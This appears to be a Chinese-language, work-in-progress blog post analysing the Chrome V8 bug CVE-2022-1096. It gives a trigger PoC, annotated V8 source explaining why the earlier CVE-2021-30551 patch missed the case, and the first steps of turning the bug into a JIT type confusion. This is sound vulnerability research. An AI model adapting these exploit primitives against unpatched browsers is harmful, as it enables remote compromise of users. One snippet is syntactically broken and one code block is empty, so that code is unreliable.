---
layout: post
title: "CVE-2022-1096 (WIP)"
---

CVE-2022-1096 是 CVE-2021-30551 的变种。

## 准备环境

阅读 [Google P0 的分析报告](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1096.html) 得知修复的版本是 99.0.4844.84，搜到对应的[发布记录](https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_25.html)，依照时间找到上一个版本是 [99.0.4844.82](https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_20.html)，使用 [获取旧版本的 Chrome](2022-05-31-get-old-version-chrome-binary.md) 中的方法构建出对应的二进制文件。

## 分析成因

将 POC 代码稍加修改，方便调试：

```javascript
style = document.createElement('p').style;
alert(1);
style.prop = { toString: () => {
  style.prop = 1;
}};
alert(2)
```

根据之前调试 CVE-2021-30551 积累的经验，漏洞是在 v8/src/objects/objects.cc：`Object::SetProperty` 函数执行过程中触发的，在 alert(1) 弹出后，在 Object::SetProperty 函数开头下断点，然后点掉弹窗，让程序断下后开始调试。

```cpp
Maybe<bool> Object::SetProperty(LookupIterator* it, Handle<Object> value,
                                StoreOrigin store_origin,
                                Maybe<ShouldThrow> should_throw) {
  if (it->IsFound()) {
    bool found = true;
    Maybe<bool> result =
        SetPropertyInternal(it, value, should_throw, store_origin, &found);
    if (found) return result;
  }

  if (!CheckContextualStoreToJSGlobalObject(it, should_throw)) {
    return Nothing<bool>();
  }
  return AddDataProperty(it, value, NONE, should_throw, store_origin);
}
```

大体和 CVE-2021-30551 的流程一致，虽然 style 对象还没有名为 prop 的属性，但是由于 style 是设置了 INTERCEPTOR 的 DOM 对象， 属性的查找结果是找到了 INTERCEPTOR，it->IsFound() 条件满足，程序走到 SetPropertyInternal 中，经过多层调用，最终到达 V8CSSStyleDeclaration::NamedPropertySetterCallback 函调函数。

```cpp
void V8CSSStyleDeclaration::NamedPropertySetterCallback(
    v8::Local<v8::Name> v8_property_name,
    v8::Local<v8::Value> v8_property_value,
    const v8::PropertyCallbackInfo<v8::Value>& info) {
  RUNTIME_CALL_TIMER_SCOPE_DISABLED_BY_DEFAULT(
      info.GetIsolate(), "Blink_CSSStyleDeclaration_NamedPropertySetter");

  // 3.9.2. [[Set]]
  // https://webidl.spec.whatwg.org/#legacy-platform-object-set
  // step 1. If O and Receiver are the same object, then:
  if (info.Holder() == info.This()) {
    // step 1.2.1. Invoke the named property setter with P and V.
    v8::Isolate* isolate = info.GetIsolate();
    const ExceptionState::ContextType exception_state_context_type =
        ExceptionContext::Context::kNamedPropertySet;
    const char* const class_like_name = "CSSStyleDeclaration";
    ExceptionState exception_state(isolate, exception_state_context_type,
                                   class_like_name);

    // [CEReactions]
    CEReactionsScope ce_reactions_scope;

    v8::Local<v8::Object> v8_receiver = info.Holder();
    CSSStyleDeclaration* blink_receiver =
        V8CSSStyleDeclaration::ToWrappableUnsafe(v8_receiver);
    v8::Local<v8::Context> receiver_context =
        v8_receiver->GetCreationContextChecked();
    ScriptState* receiver_script_state = ScriptState::From(receiver_context);
    ScriptState* script_state = receiver_script_state;
    const AtomicString& blink_property_name =
        ToCoreAtomicString(v8_property_name.As<v8::String>());
    // 这里会把值转换成字符串，触发其 toString 方法的回调
    auto&& blink_property_value =
        NativeValueTraits<IDLStringTreatNullAsEmptyString>::ArgumentValue(
            isolate, 1, v8_property_value, exception_state);
    if (UNLIKELY(exception_state.HadException())) {
      return;
    }
    auto&& return_value = blink_receiver->AnonymousNamedSetter(
        script_state, blink_property_name, blink_property_value);
    bindings::V8SetReturnValue(info, return_value);
    // CSSStyleDeclaration is abusing named properties.
    // Do not intercept if the property is not found.
    return;
  }

  // Do not intercept.  Fallback to OrdinarySetWithOwnDescriptor.
}
```

	在 Interceptor 回调中有一个把属性值转换成字符串的流程，这个地方会调用值的 toString 方法，而 toString 方法里会再次设置 prop 属性，这次设置的值为 1，设置完成后控制流最终返回到外层的值设置中，乍看和 CVE-2021-30551 好像没什么区别，为什么 CVE-2021-30551 的补丁没有解决这个问题呢？ 仔细查看修补的地方发现，由于 CVE-2021-30551 漏洞触发需要将 DOM 对象 HTMLEmbed 作为普通对象的原型，所以其补丁代码放到了针对原型的属性设置代码路径上，并不能覆盖直接给 DOM 对象设置属性的情况。 

```cpp
Maybe<bool> Object::SetPropertyInternal(LookupIterator* it,
                                        Handle<Object> value,
                                        Maybe<ShouldThrow> should_throw,
                                        StoreOrigin store_origin, bool* found) {
 ...

  do {
    switch (it->state()) {
      ...

      case LookupIterator::INTERCEPTOR: {
        if (it->HolderIsReceiverOrHiddenPrototype()) {
		    /// CVE-2022-1096 的控制流会走这里
          Maybe<bool> result =
              JSObject::SetPropertyWithInterceptor(it, should_throw, value);
          if (result.IsNothing() || result.FromJust()) return result;
        } else {
          Maybe<PropertyAttributes> maybe_attributes =
              JSObject::GetPropertyAttributesWithInterceptor(it);
          if (maybe_attributes.IsNothing()) return Nothing<bool>();
          if ((maybe_attributes.FromJust() & READ_ONLY) != 0) {
            return WriteToReadOnlyProperty(it, value, should_throw);
          }
          // >> CVE-2021-30551 的修补位置
          // At this point we might have called interceptor's query or getter
          // callback. Assuming that the callbacks have side effects, we use
          // Object::SetSuperProperty() which works properly regardless on
          // whether the property was present on the receiver or not when
          // storing to the receiver.
          if (maybe_attributes.FromJust() == ABSENT) {
            // Proceed lookup from the next state.
            it->Next();
          } else {
            // Finish lookup in order to make Object::SetSuperProperty() store
            // property to the receiver.
            it->NotFound();
          }
          return Object::SetSuperProperty(it, value, store_origin,
                                          should_throw);
        }
        break;
      }
	  ...
    }
    it->Next();
  } while (it->IsFound());

  *found = false;
  return Nothing<bool>();
}
```

## 实现利用

### 类型混淆

利用也和 CVE-2021-30551 的类似，要先将漏洞转换成类型混淆。先触发一次漏洞得到一个具有两个 prop 属性的对象 s1，代码如下：

```javascript
s1 = document.createElement('p').style;
v1 = { toString: () => {s1.prop = 1} };
s1.prop = v1;
```

之后再一次触发漏洞, 创建一个新对象 s2，不过这次漏洞触发的时候，我们希望能在设置第二个 prop 属性时，在控制流走到 LookupIterator::ApplyTransitionToDataProperty 函数时 `simple_transition` 条件为 `false`，这样控制流会走到 `ReloadPropertyInformation` 函数中，重新在 从对象中搜索 prop 属性的位置存储到 state_ 中，搜索算法是从属性描述符的数组的开头线性搜索，这样搜到的结果就是第一个 prop 属性，而不是刚刚添加的第二个 prop，最终结果对象 s2 的第二次 prop 赋值改写的是第一个 prop 属性。

```cpp
void LookupIterator::ApplyTransitionToDataProperty(
    Handle<JSReceiver> receiver) {
  ...
  Handle<Map> transition = transition_map();
  bool simple_transition = // <<<<< 关键点1
      transition->GetBackPointer(isolate_) == receiver->map(isolate_);

  ...

  if (simple_transition) {
    number_ = transition->LastAdded();
    property_details_ = transition->GetLastDescriptorDetails(isolate_);
    state_ = DATA;
  } else if (receiver->map(isolate_).is_dictionary_map()) {
	...
  } else {
    ReloadPropertyInformation<false>(); // <<<<< 关键点2
  }
}

template <bool is_element>
void LookupIterator::ReloadPropertyInformation() {
  state_ = BEFORE_PROPERTY;
  interceptor_state_ = InterceptorState::kUninitialized;
  state_ = LookupInHolder<is_element>(holder_->map(isolate_), *holder_); // <<< 关键点3
  DCHECK(IsFound() || !holder_->HasFastProperties(isolate_));
}
```

代码如下：

```javascript
s2 = document.createElement('p').style;
v2 = { toString: () => {s2.prop = 1; s2.__proro__ =  };
s2.prop = v2;
```

在属性访问的时候也是用同一个线性搜索算法，所以后续访问过程中可以忽略第二次添加的 prop 属性，实际生效的都是存储在第一个 prop 属性处的值，对于 s1 来说是第一个添加的，对于 s2 来说是第二次添加的。

有了 s1, s2 这两个有微妙区别的对象以后，还需要 JIT 编译机制的辅助才能实现类型混淆，定义一个读取 prop 对象的函数 f, 用 s1 触发 f 的 JIT 编译，再用 f 读取 s2 的 prop 对象，由于 s1, s2 的 map 是相同的，但是他们的 prop 属性是不同的，f 的代码是 JIT 编译器专门为 s1.prop 属性生成的，用于 s2.prop 上时，就造成了类型混淆。

```

```


---
⚠️ 提示：这里还要注意访问 prop 属性前，其实本应该有一个检查 prop 值的 Map 是否符合推断的 CheckMap 节点的，也是因为对象满足了 JIT 编译的优化掉条件，JIT 编译被优化掉了，才使得类型混淆最终得以实现，详情可以参考[我之前对 CVE-2021-30551 的分析](2022-04-30-CVE-2021-30551)。
	
---